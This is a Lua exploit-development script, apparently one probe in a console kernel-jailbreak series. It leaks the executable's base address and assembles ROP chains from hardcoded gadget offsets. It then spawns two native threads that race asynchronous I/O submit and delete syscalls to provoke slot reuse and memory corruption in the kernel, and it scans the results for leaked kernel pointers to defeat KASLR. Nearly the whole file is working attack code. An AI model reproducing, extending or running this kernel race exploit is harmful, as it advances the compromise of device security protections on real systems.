-- CRASH_CLASS: HIGH
-- PROBE 69h: native-speed submit-during-delete race
--
-- 69g showed slot reuse is 100% but SEQUENTIAL (delete finishes before
-- Lua submits begin). This probe fixes that by running BOTH operations
-- from child thread ROP chains at native speed:
--   Child A: 662 (batch delete) on polled IDs
--   Child B: 669 (submit) × 32 unrolled iterations
--
-- Key: pop_r8_ret at eboot+0x991 (bytes 47 58 C3, REX.RXB encoding)
-- enables 5-arg syscalls from child ROP. 386a missed it (searched 41 58 C3 only).
-- Verified by probe 396f.
--
-- Detection: anomalous delete states, slot collisions with timing overlap,
-- kernel pointers in reclaimed objects.

print("=== PROBE 69h: native submit-during-delete race ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X%08X", h, l)
end
local function sgn(v)
    local l = N(v)
    if l >= 0x80000000 then l = l - 0x100000000 end
    return l
end
local function put_str(s)
    local p = memory.alloc(#s + 2)
    for i = 1, #s do
        pcall(function() memory.write_byte(p + i - 1, string.byte(s, i)) end)
    end
    pcall(function() memory.write_byte(p + #s, 0) end)
    return p
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

-- Eboot base
local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local elo = rd(N(ib) + 0x108) or 0
local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local eb = uint64(string.format("0x%X%08X", ehi, elo))
print("eboot=" .. fmt(eb))

-- ROP gadgets
local g_pop_rax = eb + 0x992
local g_pop_rdi = eb + 0xC9DFE
local g_pop_rsi = eb + 0xD77D
local g_pop_rdx = eb + 0x3B02D7
local g_pop_rcx = eb + 0xE64
local g_pop_r8  = eb + 0x991
local g_bare_ret = eb + 0x42
local g_mov_m_rax = eb + 0x92C67

-- Ignore SIGSYS/SIGPIPE
local sa = memory.alloc(0x20)
wq(N(sa), uint64(1)); wd(N(sa) + 8, 0); wq(N(sa) + 16, uint64(0))
pcall(function() mk(416)(uint64(11), sa, uint64(0)) end)
pcall(function() mk(416)(uint64(12), sa, uint64(0)) end)
pcall(function() mk(416)(uint64(13), sa, uint64(0)) end)

-- Fake TCB for children (errno needs %fs:0)
local tcb_page = memory.alloc(0x1000)
for i = 0, 0xFF8, 8 do wq(N(tcb_page) + i, uint64(N(tcb_page))) end
local tcb_ptr = memory.alloc(8)
wq(N(tcb_ptr), uint64(N(tcb_page)))

-- /dev/zero fd for AIO reads
local fd_zero = sgn(mk(5)(put_str("/dev/zero"), uint64(0), uint64(0)))
print("/dev/zero fd=" .. fd_zero)

local BATCH = 16
local SUB_COUNT = 32
local reqs = memory.alloc(0x30)
local data_buf = memory.alloc(0x1000)
local result_buf = memory.alloc(0x100)
local one_id = memory.alloc(8)
local one_st = memory.alloc(8)

local function submit_one()
    wq(N(reqs), uint64(0))
    wq(N(reqs) + 8, uint64(16))
    local bh, bl = get_hi_lo(uint64(N(data_buf)))
    wd(N(reqs) + 0x10, bl); wd(N(reqs) + 0x14, bh)
    local rh, rl = get_hi_lo(uint64(N(result_buf)))
    wd(N(reqs) + 0x18, rl); wd(N(reqs) + 0x1C, rh)
    wd(N(reqs) + 0x20, fd_zero); wd(N(reqs) + 0x24, 0)
    wd(N(one_id), 0)
    pcall(function()
        mk(669)(uint64(1), uint64(N(reqs)), uint64(1), uint64(1), uint64(N(one_id)))
    end)
    return rd(N(one_id)) or 0
end

local function poll_one(id)
    wd(N(one_id), id); wd(N(one_st), 0)
    pcall(function()
        mk(664)(uint64(N(one_id)), uint64(1), uint64(N(one_st)))
    end)
end

-- [A] Sanity check
print("")
print("[A] sanity check")
local tid = submit_one()
print("  submit id=0x" .. string.format("%X", tid))
poll_one(tid)
wd(N(one_id), tid); wd(N(one_st), 0xDEAD)
pcall(function() mk(662)(uint64(N(one_id)), uint64(1), uint64(N(one_st))) end)
print("  delete state=0x" .. string.format("%X", rd(N(one_st)) or 0))
if not alive() then print("DEAD after sanity"); return end

-- Shared buffers
local del_ids    = memory.alloc(4 * BATCH + 0x10)
local del_states = memory.alloc(4 * BATCH + 0x10)
local marker_del = memory.alloc(8)
local marker_sub = memory.alloc(8)
local del_ret    = memory.alloc(8)
local sub_done   = memory.alloc(8)

-- Child B's request struct (pre-filled, reused every 669 call)
local sub_reqs   = memory.alloc(0x30)
local sub_data   = memory.alloc(0x1000)
local sub_result = memory.alloc(0x100)
local sub_ids    = memory.alloc(4 * SUB_COUNT + 0x10)

wq(N(sub_reqs), uint64(0))
wq(N(sub_reqs) + 8, uint64(16))
local sdh, sdl = get_hi_lo(uint64(N(sub_data)))
wd(N(sub_reqs) + 0x10, sdl); wd(N(sub_reqs) + 0x14, sdh)
local srh, srl = get_hi_lo(uint64(N(sub_result)))
wd(N(sub_reqs) + 0x18, srl); wd(N(sub_reqs) + 0x1C, srh)
wd(N(sub_reqs) + 0x20, fd_zero); wd(N(sub_reqs) + 0x24, 0)

-- [B] Race loop
print("")
print("[B] RACE — native delete child vs native submit child, " .. BATCH .. " IDs × 20 iters")

local ITERS = 20
local total_collisions = 0
local total_anomalies = 0
local total_kptrs = 0

for iter = 1, ITERS do
    if not alive() then
        print(string.format("  iter %d: *** DEAD ***", iter))
        break
    end

    -- Submit + poll BATCH requests
    local ids = {}
    for i = 1, BATCH do
        local id = submit_one()
        if id ~= 0 then
            poll_one(id)
            table.insert(ids, id)
        end
    end
    if #ids < 2 then
        print(string.format("  iter %d: only got %d IDs, skip", iter, #ids))
        break
    end
    local count = #ids

    -- Write shared arrays + sentinels
    for i = 0, count - 1 do
        wd(N(del_ids) + i * 4, ids[i + 1])
        wd(N(del_states) + i * 4, 0xDDDDDDDD)
    end
    for i = 0, SUB_COUNT - 1 do
        wd(N(sub_ids) + i * 4, 0)
    end
    wq(N(marker_del), uint64(0))
    wq(N(marker_sub), uint64(0))
    wq(N(del_ret), uint64(0xFFFFFFFF))
    wq(N(sub_done), uint64(0))

    -- Child A (deleter): sysarch → marker → 662 → save ret → thr_exit
    local stk_A = memory.alloc(0x4000)
    local sb_A = N(stk_A)
    local rsp_A = sb_A + 0x2000 - ((sb_A + 0x2000) % 16) - 8
    for i = 0, 0x1FFC, 4 do wd(sb_A + i, 0) end
    local oA = 0
    local function emA(v) wq(rsp_A + oA, v); oA = oA + 8 end
    -- sysarch(SET_FSBASE=129, &tcb_ptr)
    emA(g_pop_rdi); emA(uint64(129))
    emA(g_pop_rsi); emA(uint64(N(tcb_ptr)))
    emA(g_pop_rax); emA(uint64(165))
    emA(stub)
    -- marker
    emA(g_pop_rax); emA(uint64(0xDE1E7E01))
    emA(g_pop_rdi); emA(uint64(N(marker_del)))
    emA(g_mov_m_rax)
    -- 662(del_ids, count, del_states)
    emA(g_pop_rdi); emA(uint64(N(del_ids)))
    emA(g_pop_rsi); emA(uint64(count))
    emA(g_pop_rdx); emA(uint64(N(del_states)))
    emA(g_pop_rax); emA(uint64(662))
    emA(stub)
    -- save return value
    emA(g_pop_rdi); emA(uint64(N(del_ret)))
    emA(g_mov_m_rax)
    -- thr_exit(0)
    emA(g_pop_rdi); emA(uint64(0))
    emA(g_pop_rax); emA(uint64(431))
    emA(stub)

    -- Child B (submitter): sysarch → marker → 32× 669 → done marker → thr_exit
    -- Each 669: 7 gadgets × 8 bytes = 56 bytes. 32 calls = 1792 bytes + setup ~300 = ~2100
    local stk_B = memory.alloc(0x8000)
    local sb_B = N(stk_B)
    local rsp_B = sb_B + 0x6000 - ((sb_B + 0x6000) % 16) - 8
    for i = 0, 0x5FFC, 4 do wd(sb_B + i, 0) end
    local oB = 0
    local function emB(v) wq(rsp_B + oB, v); oB = oB + 8 end
    -- sysarch(SET_FSBASE=129, &tcb_ptr)
    emB(g_pop_rdi); emB(uint64(129))
    emB(g_pop_rsi); emB(uint64(N(tcb_ptr)))
    emB(g_pop_rax); emB(uint64(165))
    emB(stub)
    -- marker
    emB(g_pop_rax); emB(uint64(0x5B517E01))
    emB(g_pop_rdi); emB(uint64(N(marker_sub)))
    emB(g_mov_m_rax)
    -- 32× unrolled 669 calls
    for si = 0, SUB_COUNT - 1 do
        -- 669(cmd=1, sub_reqs, count=1, class=1, &sub_ids[si])
        -- ABI through fn_addr stub: rdi=arg1, rsi=arg2, rdx=arg3, rcx→r10=arg4, r8=arg5
        emB(g_pop_rdi); emB(uint64(1))                           -- cmd=1
        emB(g_pop_rsi); emB(uint64(N(sub_reqs)))                 -- reqs_ptr
        emB(g_pop_rdx); emB(uint64(1))                           -- count=1
        emB(g_pop_rcx); emB(uint64(1))                           -- class=1
        emB(g_pop_r8);  emB(uint64(N(sub_ids) + si * 4))         -- &ids_out[si]
        emB(g_pop_rax); emB(uint64(669))                          -- syscall number
        emB(stub)
    end
    -- done marker
    emB(g_pop_rax); emB(uint64(0xD04E0069))
    emB(g_pop_rdi); emB(uint64(N(sub_done)))
    emB(g_mov_m_rax)
    -- thr_exit(0)
    emB(g_pop_rdi); emB(uint64(0))
    emB(g_pop_rax); emB(uint64(431))
    emB(stub)

    -- thr_new params
    local par_A = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do wd(N(par_A) + i, 0) end
    wq(N(par_A), g_bare_ret)
    wq(N(par_A) + 0x10, uint64(sb_A))
    wq(N(par_A) + 0x18, uint64(0x2000))
    local tA = memory.alloc(8); wq(N(tA), uint64(0))
    wq(N(par_A) + 0x30, tA)

    local par_B = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do wd(N(par_B) + i, 0) end
    wq(N(par_B), g_bare_ret)
    wq(N(par_B) + 0x10, uint64(sb_B))
    wq(N(par_B) + 0x18, uint64(0x6000))
    local tB = memory.alloc(8); wq(N(tB), uint64(0))
    wq(N(par_B) + 0x30, tB)

    -- Spawn both back-to-back for maximum race overlap
    pcall(function() mk(455)(par_A, uint64(0x38)) end)
    pcall(function() mk(455)(par_B, uint64(0x38)) end)

    -- Wait for both to finish
    for w = 1, 100000 do local _ = rd(sb_A) end

    -- Check markers
    local del_ran = (N(rq(N(marker_del))) ~= 0)
    local sub_ran = (N(rq(N(marker_sub))) ~= 0)
    local sub_finished = (N(rq(N(sub_done))) ~= 0)

    -- Count delete states
    local del_ok = 0
    local del_fail = 0
    local del_sentinel = 0
    local del_weird = 0
    for i = 0, count - 1 do
        local st = rd(N(del_states) + i * 4) or 0xDDDDDDDD
        if st == 0 then
            del_ok = del_ok + 1
        elseif st == 0xDDDDDDDD then
            del_sentinel = del_sentinel + 1
        elseif st == 0x80020003 or st == 0x80020010 then
            del_fail = del_fail + 1
        else
            del_weird = del_weird + 1
        end
    end

    -- Count new submit IDs
    local new_ids = {}
    for i = 0, SUB_COUNT - 1 do
        local nid = rd(N(sub_ids) + i * 4) or 0
        if nid ~= 0 then table.insert(new_ids, nid) end
    end

    -- Slot collision check
    local old_set = {}
    for _, id in ipairs(ids) do old_set[id % 8192] = id end
    local collisions = 0
    local reused = {}
    for _, nid in ipairs(new_ids) do
        local slot = nid % 8192
        if old_set[slot] then
            collisions = collisions + 1
            table.insert(reused, {old = old_set[slot], new = nid})
        end
    end

    -- Kernel pointer scan in new IDs
    local kptr_hits = 0
    for _, nid in ipairs(new_ids) do
        local h, l = get_hi_lo(uint64(nid))
        if h >= 0xFFFF8000 then kptr_hits = kptr_hits + 1 end
    end

    total_collisions = total_collisions + collisions
    total_anomalies = total_anomalies + del_weird
    total_kptrs = total_kptrs + kptr_hits

    local tag = ""
    if del_weird > 0 then tag = tag .. " *** ANOMALOUS STATE ***" end
    if collisions > 0 then tag = tag .. " *** SLOT REUSE ***" end
    if kptr_hits > 0 then tag = tag .. " *** KPTR ***" end

    if del_weird > 0 or kptr_hits > 0 or collisions > 0 or iter <= 3 or iter == ITERS then
        print(string.format("  iter %d: del=%s sub=%s/%s del_ok=%d fail=%d sent=%d weird=%d | new=%d coll=%d kptr=%d%s",
            iter,
            del_ran and "Y" or "N",
            sub_ran and "Y" or "N",
            sub_finished and "Y" or "N",
            del_ok, del_fail, del_sentinel, del_weird,
            #new_ids, collisions, kptr_hits, tag))
        if del_weird > 0 then
            for i = 0, count - 1 do
                local st = rd(N(del_states) + i * 4) or 0
                if st ~= 0 and st ~= 0xDDDDDDDD and st ~= 0x80020003 and st ~= 0x80020010 then
                    print(string.format("    weird[%d] id=0x%X st=0x%08X", i, ids[i+1], st))
                end
            end
        end
        if kptr_hits > 0 then
            for _, nid in ipairs(new_ids) do
                local h, l = get_hi_lo(uint64(nid))
                if h >= 0xFFFF8000 then
                    print(string.format("    KPTR in sub_ids: 0x%08X%08X", h, l))
                end
            end
        end
    elseif iter == 4 then print("  ...") end

    -- Cleanup: poll + delete new IDs to avoid leaking kernel objects
    for _, nid in ipairs(new_ids) do
        poll_one(nid)
        wd(N(one_id), nid); wd(N(one_st), 0)
        pcall(function() mk(662)(uint64(N(one_id)), uint64(1), uint64(N(one_st))) end)
    end
end

print("")
print("[C] SUMMARY")
print(string.format("  iterations:       %d", ITERS))
print(string.format("  IDs per iter:     %d", BATCH))
print(string.format("  submits per iter: %d", SUB_COUNT))
print(string.format("  slot collisions:  %d", total_collisions))
print(string.format("  anomalous states: %d", total_anomalies))
print(string.format("  kernel pointers:  %d", total_kptrs))
print(string.format("  process:          %s", alive() and "ALIVE" or "DEAD"))

if total_kptrs > 0 then
    print("")
    print("*** KERNEL POINTERS FOUND — KASLR defeat candidate ***")
elseif total_anomalies > 0 then
    print("")
    print("*** ANOMALOUS DELETE STATES — possible corruption from concurrent submit ***")
elseif total_collisions > 0 then
    print("")
    print("Slot reuse detected. Check if timing overlaps (both markers set before either finishes).")
else
    print("")
    print("No anomalies. Both children may still serialize — check marker timing.")
end

print("")
print("=== 69h COMPLETE ===")
